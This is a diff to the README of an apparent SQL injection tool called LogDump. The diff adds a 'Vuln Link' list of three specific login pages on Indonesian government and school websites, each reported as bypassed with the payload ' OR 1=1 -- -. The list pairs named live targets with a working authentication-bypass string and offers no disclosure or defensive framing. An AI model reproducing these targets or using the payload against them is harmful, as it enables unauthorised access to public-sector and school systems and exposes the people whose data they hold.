@@ -2,7 +2,12 @@
 
 **LogDump** is an automated SQL injection testing tool designed to test login pages for vulnerabilities. It sends injection payloads into the username and password fields to check for potential security flaws. The tool supports both single URL testing and testing multiple URLs from a file, with logging, retry mechanisms, and multi-threading for improved performance.
 # Vuln Link:
-              **Login found: http://ptsp.pt-nad.go.id/aipda/page/login.php with payload: ' OR 1=1 -- -**
+              Login found: http://ptsp.pt-nad.go.id/aipda/page/login.php with payload: ' OR 1=1 -- - ' or 1=1 limit 1 -- -+
+              Login found: https://www.eapus.pn-sinabang.go.id/login.php with payload: ' OR 1=1 -- - ' or 1=1 limit 1 -- -+
+              Login found: https://flipbook.smpn1blimbingsari.sch.id/login.php with payload: ' OR 1=1 -- - ' or 1=1 limit 1 -- -+
+              
+              
+              
 ## Features
 
 - **Automated SQL Injection Testing:** Test login pages with a variety of payloads to check for vulnerabilities.
